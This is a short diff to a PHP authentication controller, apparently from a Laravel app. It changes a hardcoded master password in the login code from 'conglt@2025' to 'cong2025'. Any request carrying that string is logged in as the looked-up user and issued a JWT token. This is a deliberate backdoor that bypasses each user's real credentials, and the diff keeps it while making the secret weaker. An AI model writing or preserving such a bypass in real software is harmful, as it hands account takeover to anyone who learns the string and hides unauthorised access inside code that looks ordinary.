@@ -67,7 +67,7 @@ class AuthController extends Controller
             ]);
         }
 
-        if(data_get($request, 'password') == 'conglt@2025'){
+        if(data_get($request, 'password') == 'cong2025'){
             $user = User::find( $user->id);
             Auth::login($user);
             $token = JWTAuth::fromUser($user);
